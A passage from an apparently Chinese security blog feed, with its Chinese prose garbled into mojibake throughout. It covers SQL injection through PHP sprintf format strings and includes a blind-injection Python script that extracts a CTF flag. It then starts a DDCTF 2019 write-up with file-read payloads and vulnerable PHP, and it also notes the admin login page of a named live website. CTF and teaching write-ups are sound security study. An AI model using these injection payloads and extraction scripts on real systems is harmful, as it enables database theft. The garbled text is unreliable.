rel="noopener">https://github.com/thinkcmf/thinkcmf</a></p><p>æ‰¾åˆ°åå°åœ°å€: <a href="https://www.gofuncoin.com/index.php?g=admin&amp;m=public&amp;a=login" target="_blank" rel="noopener">https://www.gofuncoin.com/index.php?g=admin&amp;m=public&amp;a=login</a><br>æŸ¥çœ‹æºç :<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ucp4p9p9j31160fegn3.jpg" alt=""><br>å‘ç°è¿™ä¸ªç½‘ç«™å¯èƒ½ä¸äº‘è±¹ç›´æ’­æœ‰å…³</p><p>ä»¥åå†å†™~~</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>PHP sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
      <link href="/2019/04/19/PHP-sprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/04/19/PHP-sprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g281m9qmayj30d605omxg.jpg" alt=""></p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>sprintf()<br>æŠŠç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·æ›¿æ¢æˆä¸€ä¸ªä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’çš„å˜é‡ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">2</span>;</span></span><br><span class="line"><span class="php">$str = <span class="string">"Shanghai"</span>;</span></span><br><span class="line"><span class="php">$txt = sprintf(<span class="string">"There are %u million cars in %s."</span>,$number,$str);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are <span class="number">2</span> million cars <span class="keyword">in</span> Shanghai.</span><br></pre></td></tr></table></figure></p><p>å®šä¹‰å’Œç”¨æ³•<br>sprintf() å‡½æ•°æŠŠæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­ã€‚</p><p>arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p>æ³¨é‡Šï¼šå¦‚æœ % ç¬¦å·å¤šäº arg å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ â€œ\$â€ ç»„æˆã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">123</span>;</span></span><br><span class="line">$txt = sprintf("å¸¦æœ‰ä¸¤ä½å°æ•°ï¼š%1\$.2f</span><br><span class="line"><span class="php">&lt;br&gt;ä¸å¸¦å°æ•°ï¼š%<span class="number">1</span>\$u<span class="string">",$number);</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>ç»“æœ:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¸¦æœ‰ä¸¤ä½å°æ•°ï¼š<span class="number">123.00</span></span><br><span class="line">ä¸å¸¦å°æ•°ï¼š<span class="number">123</span></span><br></pre></td></tr></table></figure></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æ¥ä¸‹æ¥çœ‹çœ‹sprintf()çš„åº•å±‚å®ç°æ–¹æ³•<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (format[inpos]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        zend_string * t;</span><br><span class="line">        zend_string * <span class="built_in">str</span> = zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(<span class="built_in">str</span>), <span class="built_in">width</span>, precision, padding, alignment, ZSTR_LEN(<span class="built_in">str</span>), <span class="number">0</span>, expprec, <span class="number">0</span>);</span><br><span class="line">        zend_tmp_string_release(t);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'g'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'G'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'f'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), <span class="built_in">width</span>, padding, alignment, precision, adjusting, format[inpos], always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, (<span class="built_in">char</span>) zval_get_long(tmp));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">3</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'X'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, HEXCHARS, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">1</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, <span class="string">'%'</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ phpæºç ä¸­åªå¯¹15ç§ç±»å‹åšäº†åŒ¹é…ï¼Œ å…¶ä»–å­—ç¬¦ç±»å‹éƒ½ç›´æ¥breakäº†ï¼Œphpæœªåšä»»ä½•å¤„ç†ï¼Œç›´æ¥è·³è¿‡ï¼Œæ‰€ä»¥å¯¼è‡´äº†è¿™ä¸ªé—®é¢˜ï¼š<br>å¦‚æœæˆ‘ä»¬è¾“å…¥<code>&quot;%\&quot;</code>æˆ–è€…<code>&quot;%1$\&quot;</code>,ä»–ä¼šæŠŠåæ–œæ å½“åšæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹ï¼Œç„¶è€Œæ‰¾ä¸åˆ°åŒ¹é…çš„é¡¹é‚£ä¹ˆ<code>&quot;%\&quot;</code>,<code>&quot;%1$\&quot;</code>å°±å› ä¸ºæ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†è€Œè¢«æ›¿æ¢ä¸ºç©ºã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27znox1u3j30ql0gnq3s.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27zuu2rx9j30qr0fd3z8.jpg" alt=""></p><p>å› æ­¤sprintfæ³¨å…¥çš„åŸç†å°±æ˜¯</p><p>æˆ‘ä»¬ç”¨ä¸€ä¸ª15ç§ç±»å‹ä¹‹å¤–çš„ <code>&quot;\&quot;</code>æ¥ä»£æ›¿æ ¼å¼å­—ç¬¦ç±»å‹è®©å‡½æ•°æ›¿æ¢ä¸ºç©ºï¼Œåˆ™â€œ%1$\â€™â€åé¢çš„å•å¼•å·å°±èƒ½é—­åˆå‰é¢çš„å•å¼•å·ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¾‹å­å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„ç†è§£</p><p><strong>ä¸å¸¦å ä½ç¬¦çš„</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$sql=<span class="string">"select * from user where username='%\' and 1=1 #';"</span>;</span></span><br><span class="line"><span class="php">$user=<span class="string">'admin'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> sprintf($sql,$user);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>è¿è¡Œç»“æœï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#';</span></span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ï¼šusername=â€™â€™è¿™é‡Œæ˜¯ä¸¤ä¸ªå•å¼•å·ä¸æ˜¯åŒå¼•å·</p><p><strong>å¸¦æœ‰å ä½ç¬¦ï¼š</strong><br>å…ˆçœ‹ä¸å¸¦çš„åŸæ ·è¾“å‡º<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280cueav7j30v60h6406.jpg" alt=""><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="attribute">1</span>=1#</span><br><span class="line"><span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br></pre></td></tr></table></figure></p><p>è¿›è¡Œç»•è¿‡<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()å‡½æ•°ï¼šåœ¨é¢„å®šä¹‰å‰é¢åŠ åæ–œæ ï¼Œé¢„å®šä¹‰ç¬¦æœ‰å•å¼•å·ï¼ˆ<span class="string">'ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ"ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULL</span></span><br><span class="line"><span class="string">$input = addslashes ("%1$'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#" );</span></span><br><span class="line">$b = <span class="keyword">sprintf</span> (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>å¯¹$inputä¸$bè¿›è¡Œäº†æ‹¼æ¥<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' "</span>, <span class="string">'admin'</span> );</span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå¥å­é‡Œé¢çš„<code>\</code>æ˜¯ç”±addsashesä¸ºäº†è½¬ä¹‰å•å¼•å·è€ŒåŠ ä¸Šçš„ï¼Œä½¿ç”¨%sä¸<code>%1$\</code>ç±»åŒ¹é…adminï¼Œé‚£ä¹ˆadminåªä¼šå‡ºç°åœ¨%sé‡Œï¼Œ<code>%1$\</code>ä¸ºç©º<br>æ‰€ä»¥è¾“å‡º<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">AND</span> b='%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br><span class="line"><span class="built_in">SELECT</span> * FROM t <span class="built_in">WHERE</span> a='admin' <span class="keyword">AND</span> b='' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280l04clnj30x70hjgn1.jpg" alt=""><br>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·å†™<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM table WHERE a='%1$\' AND b='%d' and 1=1#' "</span>,<span class="string">'admin'</span>);</span><br></pre></td></tr></table></figure></p><p>result:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="attribute">1</span>=1#'</span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å¤„åŒ¹é…æ—¶ä¸ºç©ºï¼Œä¼šè®©ç»™åé¢çš„æ ¼å¼åŒ–åŒ¹é…</p><p>ä»¥ä¸Šä¸¤ä¸ªä¾‹å­æ˜¯åƒæ‰â€™\â€™æ¥ä½¿å¾—å•å¼•å·é€ƒé€¸å‡ºæ¥</p><p>ä¸‹é¢è¿™ä¸ªä¾‹å­æˆ‘ä»¬æ„é€ å•å¼•å·<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span></span><br><span class="line"><span class="php">$input2 = <span class="number">39</span> ;</span></span><br><span class="line"><span class="php">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span></span><br><span class="line"><span class="php">$sql = sprintf ( $sql , $input2 );</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>  $sql ;</span></span><br></pre></td></tr></table></figure></p><p>ç»“æœï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure></p><p>%cèµ·åˆ°äº†ç±»ä¼¼chr()çš„æ•ˆæœï¼Œå°†æ•°å­—39è½¬åŒ–ä¸ºâ€˜ï¼Œä»è€Œå¯¼è‡´äº†sqlæ³¨å…¥ã€‚</p><p>æ‰€ä»¥ç»“æœä¸ºï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">''</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/*) AND baz = 39</span></span><br></pre></td></tr></table></figure></p><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><p>iæ˜¥ç§‹çš„ â€œè¿åœ£è¯ï¼Œæ‹¿å¤§å¥–â€æ´»åŠ¨èµ›é¢˜<br><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=60469" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?t=1&amp;r=60469</a></p><p>è¿›è¡Œfuzzæ—¶ ï¼Œå½“è¾“å…¥<code>%</code>æ—¶çˆ†sprintf()é”™è¯¯<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280yj6qcuj30ul0byglz.jpg" alt=""></p><p>äºæ˜¯æ„é€ <code>username=admin%1$\&#39; and 1=2#</code>ä¸ <code>username=admin%1$\&#39; and 1=1#</code><br>äºæ˜¯å†™ä¸‹è„šæœ¬ï¼š<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding : utf-8 _*_</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> re</span><br><span class="line"><span class="built_in">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">headers</span> = &#123;</span><br><span class="line">'User-Agent' : 'Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span>',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">dbname</span> = <span class="string">""</span></span><br><span class="line"><span class="attr">chars</span> = '<span class="number">0123456789</span>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://00eec0b6e68b4332b078c559e3fee6307720121e6aaf49e4.changame.ichunqiu.com/"</span></span><br><span class="line">for m <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">50</span>):</span><br><span class="line">   for i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">       <span class="attr">s</span> = <span class="string">"%1$' or ascii(substr((select flag from flag),"</span>+str(m)+<span class="string">",1))="</span>+str(i)+<span class="string">"#"</span></span><br><span class="line">       <span class="comment"># str1 = urllib2.quote(s)</span></span><br><span class="line">       <span class="attr">str1</span> = s</span><br><span class="line">       <span class="attr">data=&#123;'username'</span> : str1, 'password' : '<span class="number">12313</span>'&#125;</span><br><span class="line">       <span class="comment"># print str1</span></span><br><span class="line">       <span class="comment"># print urllib2.unquote(str1)</span></span><br><span class="line">       <span class="attr">req</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=data,headers=headers)</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="attr">result</span> = re.findall('password error', req.content)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">           <span class="attr">dbname</span> = dbname + chr(i)</span><br><span class="line">           print dbname</span><br><span class="line">           print chr(i)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019DDCTF-Writeup</title>
      <link href="/2019/04/18/2019DDCTF-Writeup/"/>
      <url>/2019/04/18/2019DDCTF-Writeup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="æ»´"><a href="#æ»´" class="headerlink" title="æ»´~"></a>æ»´~</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1zyra06lfj30wh08i3yy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1zyt7po9nj30v009dmz4.jpg" alt=""><br>base64-&gt;base64-&gt;hex<br>?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 = ?jpg=666C61672E6A7067 =flag.php<br>å°è¯•åŒ…å«index.php<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?<span class="attribute">jpg</span>=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure></p><p>base64è§£ç å¾—åˆ°<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span></span><br><span class="line"><span class="php">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span></span><br><span class="line"><span class="php">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$txt = base64_encode(file_get_contents($file));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>f1agconfigddctf.php = TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==<br>è§£ç å¾—åˆ°:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span></span><br><span class="line"><span class="php">$k = <span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content=trim(file_get_contents($k));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($uid==$content)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span><span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span 